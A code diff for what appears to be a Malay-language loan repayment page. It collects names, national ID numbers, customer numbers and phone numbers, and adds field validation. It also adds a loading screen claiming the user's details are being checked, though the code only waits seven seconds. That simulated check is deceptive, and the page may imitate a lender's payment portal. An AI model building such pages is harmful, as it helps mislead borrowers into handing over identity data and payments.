@@ -20,6 +20,18 @@
     <style>
         .no-scrollbar::-webkit-scrollbar { display: none; }
         .no-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
+        .spinner {
+            border: 4px solid rgba(59, 130, 246, 0.1);
+            border-top: 4px solid #3b82f6;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body class="font-sans bg-[#FAF6F0] text-gray-900 min-h-screen flex flex-col justify-between">
@@ -74,7 +86,7 @@
                         <div class="flex-shrink-0 w-8 h-8 bg-blue-400 text-white rounded-full flex items-center justify-center font-bold text-xs">1</div>
                         <div>
                             <p class="font-extrabold text-slate-900 mb-1">Isi Maklumat Peribadi</p>
-                            <p class="text-gray-600 text-xs leading-relaxed">Masukkan nama penuh anda (mengikut IC), nombor kad pengenalan, ID Loan, nombor telefon, dan jumlah pembayaran yang perlu dibuat.</p>
+                            <p class="text-gray-600 text-xs leading-relaxed">Masukkan nama penuh anda (mengikut IC), nombor kad pengenalan, DJ/CUST NUMBER, nombor telefon, dan jumlah pembayaran yang perlu dibuat.</p>
                         </div>
                     </div>
                 </div>
@@ -146,6 +158,18 @@
     </div>
 
 
+    <!-- LOADING PAGE -->
+    <div id="loadingPage" class="hidden flex-col min-h-screen bg-white justify-center items-center">
+        <div class="flex flex-col items-center gap-6">
+            <img src="IMG_6715.png" alt="Logo" class="w-16 h-16 object-contain">
+            <div class="spinner"></div>
+            <p class="text-center text-gray-600 font-semibold text-sm max-w-xs">
+                Sila tunggu, sehingga maklumat anda selesai di semak
+            </p>
+        </div>
+    </div>
+
+
     <div id="paymentPage" class="hidden flex-col min-h-screen bg-white">
         <main class="max-w-md w-full mx-auto px-4 py-6 flex-grow flex flex-col items-center">
             <div class="w-20 h-20 rounded-2xl overflow-hidden shadow-xs mb-4 flex items-center justify-center">
@@ -168,11 +192,19 @@
                     </div>
                     <div>
                         <label class="block text-xs font-bold text-slate-800 mb-1.5">Nombor kad pengenalan *</label>
-                        <input type="text" id="inputIC" required placeholder="Contoh: 950102035432" class="w-full px-4 py-2.5 rounded-xl border border-gray-300 focus:ring-2 focus:ring-blue-400 focus:outline-none text-sm">
+                        <input type="text" id="inputIC" required placeholder="000000-00-0000" maxlength="14" class="w-full px-4 py-2.5 rounded-xl border border-gray-300 focus:ring-2 focus:ring-blue-400 focus:outline-none text-sm" oninput="formatIC(this)">
+                        <p id="icError" class="text-red-500 text-xs mt-1.5 hidden flex items-start gap-1">
+                            <i class="fas fa-exclamation-circle flex-shrink-0 mt-0.5"></i>
+                            <span>Nombor kad pengenalan mesti tepat 12 digit dalam format (######-##-####)</span>
+                        </p>
                     </div>
                     <div>
                         <label class="block text-xs font-bold text-slate-800 mb-1.5">DJ/CUST NUMBER *</label>
-                        <input type="text" id="inputLoanID" required placeholder="e.g DJ/CUST00000" class="w-full px-4 py-2.5 rounded-xl border border-gray-300 focus:ring-2 focus:ring-blue-400 focus:outline-none text-sm">
+                        <input type="text" id="inputLoanID" required placeholder="e.g DJ/CUST00000" class="w-full px-4 py-2.5 rounded-xl border border-gray-300 focus:ring-2 focus:ring-blue-400 focus:outline-none text-sm" oninput="validateDJCust(this)">
+                        <p id="djcustError" class="text-red-500 text-xs mt-1.5 hidden flex items-start gap-1">
+                            <i class="fas fa-exclamation-circle flex-shrink-0 mt-0.5"></i>
+                            <span>DJ/CUST NUMBER Tidak Sah</span>
+                        </p>
                         <p class="text-red-500 text-xs mt-1.5 flex items-start gap-1">
                             <i class="fas fa-info-circle flex-shrink-0 mt-0.5"></i>
                             <span>Sila rujuk di halaman website www.duitjom.com untuk cari DJ/CUST NUMBER</span>
@@ -180,7 +212,11 @@
                     </div>
                     <div>
                         <label class="block text-xs font-bold text-slate-800 mb-1.5">Nombor Telefon *</label>
-                        <input type="tel" id="inputPhone" required placeholder="Contoh: 0123456789" class="w-full px-4 py-2.5 rounded-xl border border-gray-300 focus:ring-2 focus:ring-blue-400 focus:outline-none text-sm">
+                        <input type="text" id="inputPhone" required placeholder="0123456789" maxlength="11" class="w-full px-4 py-2.5 rounded-xl border border-gray-300 focus:ring-2 focus:ring-blue-400 focus:outline-none text-sm" oninput="validatePhone(this)">
+                        <p id="phoneError" class="text-red-500 text-xs mt-1.5 hidden flex items-start gap-1">
+                            <i class="fas fa-exclamation-circle flex-shrink-0 mt-0.5"></i>
+                            <span>Nombor telefon mesti antara 10-11 digit sahaja</span>
+                        </p>
                     </div>
                     <div>
                         <label class="block text-xs font-bold text-slate-800 mb-1.5">Jumlah membuat bayaran *</label>
@@ -518,10 +554,66 @@
         let timerInstance = null;
         let namaPelangganGlobal = "";
 
+        // Format IC dengan dashes
+        function formatIC(input) {
+            let value = input.value.replace(/\D/g, '');
+            if (value.length > 12) value = value.slice(0, 12);
+            
+            if (value.length <= 6) {
+                input.value = value;
+            } else if (value.length <= 8) {
+                input.value = value.slice(0, 6) + '-' + value.slice(6);
+            } else {
+                input.value = value.slice(0, 6) + '-' + value.slice(6, 8) + '-' + value.slice(8, 12);
+            }
+
+            const icError = document.getElementById('icError');
+            if (value.length === 12) {
+                icError.classList.add('hidden');
+            } else if (input.value.length > 0) {
+                icError.classList.remove('hidden');
+            }
+        }
+
+        // Validate DJ/CUST NUMBER
+        function validateDJCust(input) {
+            const value = input.value.toUpperCase();
+            const djcustError = document.getElementById('djcustError');
+            
+            // Allow only D, J, C, U, S, T letters and 0-9 numbers
+            const allowedChars = /^[DJCUST0-9/]*$/;
+            
+            if (!allowedChars.test(value)) {
+                // Remove invalid character
+                input.value = value.replace(/[^DJCUST0-9/]/g, '');
+                djcustError.classList.remove('hidden');
+            } else {
+                input.value = value;
+                djcustError.classList.add('hidden');
+            }
+        }
+
+        // Validate Phone Number
+        function validatePhone(input) {
+            const value = input.value.replace(/\D/g, '');
+            const phoneError = document.getElementById('phoneError');
+            
+            if (value.length > 11) {
+                input.value = value.slice(0, 11);
+            } else {
+                input.value = value;
+            }
+
+            if (value.length > 0 && (value.length < 10 || value.length > 11)) {
+                phoneError.classList.remove('hidden');
+            } else {
+                phoneError.classList.add('hidden');
+            }
+        }
+
         function goToPaymentPage() {
             document.getElementById('mainPage').classList.add('hidden');
             document.getElementById('paymentPage').classList.remove('hidden');
-            // Tambahkan tutorial popup sebelum payment page
             setTimeout(() => { 
                 document.getElementById('tutorialModal').classList.remove('hidden'); 
             }, 200);
@@ -529,7 +621,6 @@
 
         function closeTutorialModal() {
             document.getElementById('tutorialModal').classList.add('hidden');
-            // Tutup selepas tutorial ditutup, papar scammer warning
             setTimeout(() => { 
                 document.getElementById('scammerModal').classList.remove('hidden'); 
             }, 200);
@@ -542,32 +633,58 @@
         function goToNextStepPage(event) {
             event.preventDefault();
 
-            const nama = document.getElementById('inputNama').value;
-            const ic = document.getElementById('inputIC').value;
-            const loanID = document.getElementById('inputLoanID').value;
+            // Validation
+            const ic = document.getElementById('inputIC').value.replace(/\D/g, '');
             const phone = document.getElementById('inputPhone').value;
-            const amaun = document.getElementById('inputAmaun').value;
+            const djcust = document.getElementById('inputLoanID').value;
 
-            namaPelangganGlobal = nama;
+            if (ic.length !== 12) {
+                alert('Sila masukkan nombor kad pengenalan yang sah (12 digit)');
+                return;
+            }
 
-            document.getElementById('reviewNama').innerText = nama;
-            document.getElementById('reviewIC').innerText = ic;
-            document.getElementById('reviewLoanID').innerText = loanID.toUpperCase();
-            document.getElementById('reviewPhone').innerText = phone;
-            
-            const amaunFormat = parseFloat(amaun).toFixed(2);
-            document.getElementById('reviewAmaun').innerText = "RM " + amaunFormat;
+            if (phone.length < 10 || phone.length > 11) {
+                alert('Sila masukkan nombor telefon yang sah (10-11 digit)');
+                return;
+            }
 
-            document.getElementById('displayLoanID').innerText = loanID.toUpperCase();
-            document.getElementById('displayMainAmaun').innerText = "RM " + amaunFormat;
-            document.getElementById('displaySubAmaun').innerText = "RM " + amaunFormat;
+            const djcustRegex = /^[DJCUST0-9/]*$/;
+            if (!djcustRegex.test(djcust)) {
+                alert('DJ/CUST NUMBER Tidak Sah');
+                return;
+            }
 
-            document.getElementById('qrLoanID').innerText = loanID.toUpperCase();
-            document.getElementById('qrMainAmaun').innerText = "RM " + amaunFormat;
-
+            // Show loading page
             document.getElementById('paymentPage').classList.add('hidden');
-            document.getElementById('nextStepPage').classList.remove('hidden');
-            window.scrollTo({top: 0, behavior: 'smooth'});
+            document.getElementById('loadingPage').classList.remove('hidden');
+
+            // After 7 seconds, proceed to next step
+            setTimeout(() => {
+                const nama = document.getElementById('inputNama').value;
+                const loanID = document.getElementById('inputLoanID').value;
+                const amaun = document.getElementById('inputAmaun').value;
+
+                namaPelangganGlobal = nama;
+
+                document.getElementById('reviewNama').innerText = nama;
+                document.getElementById('reviewIC').innerText = document.getElementById('inputIC').value;
+                document.getElementById('reviewLoanID').innerText = loanID.toUpperCase();
+                document.getElementById('reviewPhone').innerText = phone;
+                
+                const amaunFormat = parseFloat(amaun).toFixed(2);
+                document.getElementById('reviewAmaun').innerText = "RM " + amaunFormat;
+
+                document.getElementById('displayLoanID').innerText = loanID.toUpperCase();
+                document.getElementById('displayMainAmaun').innerText = "RM " + amaunFormat;
+                document.getElementById('displaySubAmaun').innerText = "RM " + amaunFormat;
+
+                document.getElementById('qrLoanID').innerText = loanID.toUpperCase();
+                document.getElementById('qrMainAmaun').innerText = "RM " + amaunFormat;
+
+                document.getElementById('loadingPage').classList.add('hidden');
+                document.getElementById('nextStepPage').classList.remove('hidden');
+                window.scrollTo({top: 0, behavior: 'smooth'});
+            }, 7000);
         }
 
         function backToInformationPage() {
